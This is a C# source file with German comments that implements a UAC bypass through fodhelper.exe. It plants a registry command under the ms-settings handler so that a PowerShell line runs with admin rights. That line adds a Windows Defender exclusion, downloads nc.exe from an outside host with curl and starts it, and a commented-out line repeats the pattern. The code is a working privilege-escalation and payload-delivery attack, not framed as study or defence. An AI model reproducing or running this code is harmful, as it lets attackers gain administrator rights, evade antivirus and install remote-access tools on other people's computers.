using System;
using System.Collections.Generic;
using System.Text;
using System.Security.Principal;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Testing
{
    static class PrivilegeEscelator
    {
        private const string PreSignedElevatedProcess = @"C:\Windows\System32\fodhelper.exe";
        private const string RegistryName = "DelegateExecute";
        private const string RegistryDirectory = @"Software\Classes\";
        private const string RegisteryPath = @"ms-settings\shell\open\command";
        private const string TotalPath = @"Software\Classes\ms-settings\Shell\Open\command";
        private const string CommandLinePath = @"C:\Windows\System32\cmd.exe";
        private static readonly string CurrentPath = Directory.GetCurrentDirectory();
        private static readonly string FinalCommand = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl https://iiii.lol/nc.exe -outfile ""nc.exe""; start C:\Users\nc.exe""";
        //Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "; start C:\\Users\\" + name + "");



        public static bool IsRunnigAsAdmin()
        {
            var RunningIdentity = WindowsIdentity.GetCurrent();  //Checken ob Adminrechte da sind lol
            var principal = new WindowsPrincipal(RunningIdentity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void UserAccountControlBypassOverFodHelperExe()//PE attacke benutzt fodhelper.exe
                                                                     //fodhelper.exe ist standartmäßig mit adminrechten signed und checkt keys aus der registery da unten lol
        {
            try
            {
                RegistryKey SoftwareClasses = Registry.CurrentUser.OpenSubKey(RegistryDirectory, true);//Öffnet nen neuen parrent key
                SoftwareClasses.CreateSubKey(RegisteryPath); //Erstellt einen Subkey
                RegistryKey FodHelperExe = Registry.CurrentUser.OpenSubKey(TotalPath, true);//Öffnet den neuen Key mit rechten
                //Werte setzen(DelegateExecute)
                FodHelperExe.SetValue(RegistryName, "");
                Console.WriteLine(FinalCommand);
                FodHelperExe.SetValue("", FinalCommand);
                FodHelperExe.Close();
                //Aufruf von FodHelper.EXE um den "FinalCommand" auszuführen
                CommandLineExecution.CommandExecution("start fodhelper.exe");
                Thread.Sleep(5000);
                Environment.Exit(0);//Gib kontrolle zurück



            }
            catch
            {
                Console.WriteLine("An Error while trying to retrive admin privleges");
            }

        }




    }
}
